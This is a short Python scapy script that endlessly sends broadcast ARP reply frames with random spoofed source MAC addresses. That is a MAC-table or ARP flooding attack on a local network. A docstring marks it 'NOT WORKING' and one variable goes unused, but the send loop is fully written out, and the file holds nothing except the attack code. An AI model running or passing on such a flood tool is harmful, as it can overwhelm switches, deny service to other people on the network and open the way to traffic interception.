#!venv/bin/python

''' NOT WORKING '''

from scapy.all import *
from scapy.all import Ether, ARP

source_interface = "Ethernet"
destination_ip = "192.168.80.81"


pck = Ether(src=RandMAC(), dst="FF:FF:FF:FF:FF:FF")/ARP(op=2,  psrc="0.0.0.0", hwdst="FF:FF:FF:FF:FF:FF")
pck.show()
while True: # loop in order to re-call RandMAC
    pck = Ether(src=RandMAC(), dst="FF:FF:FF:FF:FF:FF")/ARP(op=2,  psrc="0.0.0.0", hwdst="FF:FF:FF:FF:FF:FF")/Raw(b"X" * 20)
    sendp(pck, iface=source_interface)